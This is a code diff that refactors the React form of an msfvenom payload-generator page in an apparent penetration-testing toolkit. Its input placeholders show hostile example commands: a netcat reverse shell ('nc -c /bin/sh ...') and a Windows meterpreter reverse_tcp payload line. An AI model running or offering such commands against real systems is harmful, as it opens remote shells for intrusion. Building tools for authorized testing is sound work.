@@ -3,14 +3,17 @@ import { useForm } from "@mantine/form";
 import { useCallback, useState } from "react";
 import { CommandHelper } from "../../utils/CommandHelper";
 import ConsoleWrapper from "../ConsoleWrapper/ConsoleWrapper";
-import { UserGuide } from "../UserGuide/UserGuide";
+import { RenderComponent, UserGuide } from "../UserGuide/UserGuide";
 import { SaveOutputToTextFile_v2 } from "../SaveOutputToFile/SaveOutputToTextFile";
 
 const title = "Payload Generator (msfvenom)";
-const description_userguide =
-    "Msfvenom is a payload generator and encoder that comes with the Metasploit Framework. " +
-    "It allows you to create various types of payloads for exploitation. " +
+const description =
+    "Msfvenom is a payload generator and encoder that comes with the Metasploit Framework. \n" +
+    "It allows you to create various types of payloads for exploitation. \n" +
     "Select the architecture, payload, and other options, then click Generate to create the payload.";
+const tutorial = "https://docs.google.com/document/d/1mlIp4rt9_W2M7kf12Dv5eAH7uwkOPIJE42QZy6D4j28/edit?usp=sharing";
+const steps = "";
+const sourcelink = "";
 
 interface FormValuesType {
     lhost: string;
@@ -297,169 +300,185 @@ const PayloadGenerator = () => {
     const architectureIndex = architectures.indexOf(selectedArchitecture);
 
     return (
-        <form onSubmit={form.onSubmit(onSubmit)}>
-            <LoadingOverlay visible={loading} />
-            {loading && (
-                <div>
-                    <Button variant="outline" color="red" style={{ zIndex: 1001 }} onClick={handleCancel}>
-                        Cancel
-                    </Button>
-                </div>
-            )}
-
-            <Stack>
-                {UserGuide(title, description_userguide)}
-
-                {/* Add the "Custom" switch */}
-                <Switch
-                    label="Custom"
-                    checked={isCustomMode}
-                    onChange={() => {
-                        setIsCustomMode(!isCustomMode);
-                        setSelectedPayload(""); // Clear selected payload when switching modes
-                    }}
-                />
-
-                {isCustomMode ? (
-                    <TextInput
-                        label="Custom Input"
-                        placeholder="Enter your custom input, eg: -p windows/meterpreter/reverse_tcp -f exe LHOST= xxx.xxx.xxx.xxx LPORT= 1234"
-                        {...form.getInputProps("custom")}
-                        required
-                    />
-                ) : (
-                    <>
-                        <NativeSelect
-                            value={selectedArchitecture}
-                            onChange={(e) => {
-                                setSelectedArchitecture(e.target.value);
-                                setSelectedPayload("");
-                            }}
-                            title="Select Architecture"
-                            data={architectures}
-                            required
-                            placeholder="Select Architecture"
-                        />
-
-                        <NativeSelect
-                            value={selectedPayload}
-                            onChange={(e) => {
-                                setSelectedPayload(e.target.value);
-                                const newIndex = payloadOptions[architectureIndex].indexOf(e.target.value);
-                                setPayloadIndex(newIndex);
-                                setRequiredVariables(payloadRequiredVariables[architectureIndex][newIndex] || []);
-                            }}
-                            title="Select Payload"
-                            data={payloadOptions[architectureIndex] || []}
-                            required
-                            placeholder="Select Payload"
-                        />
-
-                        {/* Render other inputs based on requiredVariables */}
-                        {requiredVariables.includes("LHOST") && (
-                            <TextInput
-                                label="LHOST"
-                                placeholder="Enter LHOST eg. 192.168.1.1"
-                                {...form.getInputProps("lhost")}
-                            />
-                        )}
-                        {requiredVariables.includes("LPORT") && (
-                            <TextInput
-                                label="LPORT"
-                                placeholder="Enter LPORT eg. 1335"
-                                {...form.getInputProps("lport")}
-                            />
-                        )}
-                        {requiredVariables.includes("RHOST") && (
-                            <TextInput
-                                label="RHOST"
-                                placeholder="Enter RHOST eg. 192.168.2.1"
-                                {...form.getInputProps("rhost")}
-                            />
-                        )}
-                        {requiredVariables.includes("USER") && (
-                            <TextInput label="USER" placeholder="Enter USERNAME" {...form.getInputProps("user")} />
-                        )}
-                        {requiredVariables.includes("PASS") && (
-                            <TextInput label="PASS" placeholder="Enter PASSWORD" {...form.getInputProps("pass")} />
-                        )}
-                        {requiredVariables.includes("TEXT") && (
-                            <TextInput
-                                label="TEXT"
-                                placeholder="Enter TEXT eg Hellow World"
-                                {...form.getInputProps("text")}
-                            />
-                        )}
-                        {requiredVariables.includes("URL") && (
-                            <TextInput
-                                label="URL"
-                                placeholder="Enter URL eg. https://www.yoursite.com"
-                                {...form.getInputProps("url")}
-                            />
-                        )}
-                        {requiredVariables.includes("CMD") && (
-                            <TextInput
-                                label="CMD"
-                                placeholder="Enter CMD eg. nc -c /bin/sh 192.168.2.1 1234"
-                                {...form.getInputProps("cmd")}
-                            />
-                        )}
-                        {requiredVariables.includes("DLL") && (
-                            <TextInput label="DLL" placeholder="Enter DLL local path" {...form.getInputProps("dll")} />
-                        )}
-                        {requiredVariables.includes("PATH") && (
-                            <TextInput label="PATH" placeholder="Enter path to file" {...form.getInputProps("path")} />
-                        )}
-                        {requiredVariables.includes("PE") && (
-                            <TextInput
-                                label="PE"
-                                placeholder="Enter path to executable file for upload"
-                                {...form.getInputProps("pe")}
-                            />
-                        )}
-                        {requiredVariables.includes("PEXEC") && (
-                            <TextInput
-                                label="PEXEC"
-                                placeholder="Enter path to executable file for upload"
-                                {...form.getInputProps("pexec")}
-                            />
-                        )}
-                        {requiredVariables.includes("FILE") && (
-                            <TextInput
-                                label="FILE"
-                                placeholder="Enter path to file for chmod"
-                                {...form.getInputProps("file")}
-                            />
-                        )}
-                        {requiredVariables.includes("MODE") && (
-                            <TextInput
-                                label="MODE"
-                                placeholder="Enter chmod value (in octal)"
-                                {...form.getInputProps("mode")}
-                            />
-                        )}
-
-                        <NativeSelect
-                            value={selectedFormat}
-                            onChange={(e) => setSelectedFormat(e.target.value)}
-                            title="Select Format"
-                            data={payloadFormats}
-                            required
-                            placeholder="Select Format"
-                        />
-                    </>
+        <RenderComponent
+            title={title}
+            description={description}
+            tutorial={tutorial}
+            steps={steps}
+            sourceLink={sourcelink}
+        >
+            <form onSubmit={form.onSubmit(onSubmit)}>
+                <LoadingOverlay visible={loading} />
+                {loading && (
+                    <div>
+                        <Button variant="outline" color="red" style={{ zIndex: 1001 }} onClick={handleCancel}>
+                            Cancel
+                        </Button>
+                    </div>
                 )}
-                <TextInput
-                    label="Output Path"
-                    placeholder="Enter output path/filename (no path defaults to src-tauri folder of DDT)"
-                    {...form.getInputProps("outputPath")}
-                />
 
-                <Button type="submit">Generate</Button>
-                {SaveOutputToTextFile_v2(output, allowSave, hasSaved, handleSaveComplete)}
-                <ConsoleWrapper output={output} clearOutputCallback={clearOutput} />
-            </Stack>
-        </form>
+                <Stack>
+                    {UserGuide(title, description)}
+
+                    {/* Add the "Custom" switch */}
+                    <Switch
+                        label="Custom"
+                        checked={isCustomMode}
+                        onChange={() => {
+                            setIsCustomMode(!isCustomMode);
+                            setSelectedPayload(""); // Clear selected payload when switching modes
+                        }}
+                    />
+
+                    {isCustomMode ? (
+                        <TextInput
+                            label="Custom Input"
+                            placeholder="Enter your custom input, eg: -p windows/meterpreter/reverse_tcp -f exe LHOST= xxx.xxx.xxx.xxx LPORT= 1234"
+                            {...form.getInputProps("custom")}
+                            required
+                        />
+                    ) : (
+                        <>
+                            <NativeSelect
+                                value={selectedArchitecture}
+                                onChange={(e) => {
+                                    setSelectedArchitecture(e.target.value);
+                                    setSelectedPayload("");
+                                }}
+                                title="Select Architecture"
+                                data={architectures}
+                                required
+                                placeholder="Select Architecture"
+                            />
+
+                            <NativeSelect
+                                value={selectedPayload}
+                                onChange={(e) => {
+                                    setSelectedPayload(e.target.value);
+                                    const newIndex = payloadOptions[architectureIndex].indexOf(e.target.value);
+                                    setPayloadIndex(newIndex);
+                                    setRequiredVariables(payloadRequiredVariables[architectureIndex][newIndex] || []);
+                                }}
+                                title="Select Payload"
+                                data={payloadOptions[architectureIndex] || []}
+                                required
+                                placeholder="Select Payload"
+                            />
+
+                            {/* Render other inputs based on requiredVariables */}
+                            {requiredVariables.includes("LHOST") && (
+                                <TextInput
+                                    label="LHOST"
+                                    placeholder="Enter LHOST eg. 192.168.1.1"
+                                    {...form.getInputProps("lhost")}
+                                />
+                            )}
+                            {requiredVariables.includes("LPORT") && (
+                                <TextInput
+                                    label="LPORT"
+                                    placeholder="Enter LPORT eg. 1335"
+                                    {...form.getInputProps("lport")}
+                                />
+                            )}
+                            {requiredVariables.includes("RHOST") && (
+                                <TextInput
+                                    label="RHOST"
+                                    placeholder="Enter RHOST eg. 192.168.2.1"
+                                    {...form.getInputProps("rhost")}
+                                />
+                            )}
+                            {requiredVariables.includes("USER") && (
+                                <TextInput label="USER" placeholder="Enter USERNAME" {...form.getInputProps("user")} />
+                            )}
+                            {requiredVariables.includes("PASS") && (
+                                <TextInput label="PASS" placeholder="Enter PASSWORD" {...form.getInputProps("pass")} />
+                            )}
+                            {requiredVariables.includes("TEXT") && (
+                                <TextInput
+                                    label="TEXT"
+                                    placeholder="Enter TEXT eg Hellow World"
+                                    {...form.getInputProps("text")}
+                                />
+                            )}
+                            {requiredVariables.includes("URL") && (
+                                <TextInput
+                                    label="URL"
+                                    placeholder="Enter URL eg. https://www.yoursite.com"
+                                    {...form.getInputProps("url")}
+                                />
+                            )}
+                            {requiredVariables.includes("CMD") && (
+                                <TextInput
+                                    label="CMD"
+                                    placeholder="Enter CMD eg. nc -c /bin/sh 192.168.2.1 1234"
+                                    {...form.getInputProps("cmd")}
+                                />
+                            )}
+                            {requiredVariables.includes("DLL") && (
+                                <TextInput
+                                    label="DLL"
+                                    placeholder="Enter DLL local path"
+                                    {...form.getInputProps("dll")}
+                                />
+                            )}
+                            {requiredVariables.includes("PATH") && (
+                                <TextInput
+                                    label="PATH"
+                                    placeholder="Enter path to file"
+                                    {...form.getInputProps("path")}
+                                />
+                            )}
+                            {requiredVariables.includes("PE") && (
+                                <TextInput
+                                    label="PE"
+                                    placeholder="Enter path to executable file for upload"
+                                    {...form.getInputProps("pe")}
+                                />
+                            )}
+                            {requiredVariables.includes("PEXEC") && (
+                                <TextInput
+                                    label="PEXEC"
+                                    placeholder="Enter path to executable file for upload"
+                                    {...form.getInputProps("pexec")}
+                                />
+                            )}
+                            {requiredVariables.includes("FILE") && (
+                                <TextInput
+                                    label="FILE"
+                                    placeholder="Enter path to file for chmod"
+                                    {...form.getInputProps("file")}
+                                />
+                            )}
+                            {requiredVariables.includes("MODE") && (
+                                <TextInput
+                                    label="MODE"
+                                    placeholder="Enter chmod value (in octal)"
+                                    {...form.getInputProps("mode")}
+                                />
+                            )}
+
+                            <NativeSelect
+                                value={selectedFormat}
+                                onChange={(e) => setSelectedFormat(e.target.value)}
+                                title="Select Format"
+                                data={payloadFormats}
+                                required
+                                placeholder="Select Format"
+                            />
+                        </>
+                    )}
+                    <TextInput
+                        label="Output Path"
+                        placeholder="Enter output path/filename (no path defaults to src-tauri folder of DDT)"
+                        {...form.getInputProps("outputPath")}
+                    />
+
+                    <Button type="submit">Generate</Button>
+                    {SaveOutputToTextFile_v2(output, allowSave, hasSaved, handleSaveComplete)}
+                    <ConsoleWrapper output={output} clearOutputCallback={clearOutput} />
+                </Stack>
+            </form>
+        </RenderComponent>
     );
 };
 
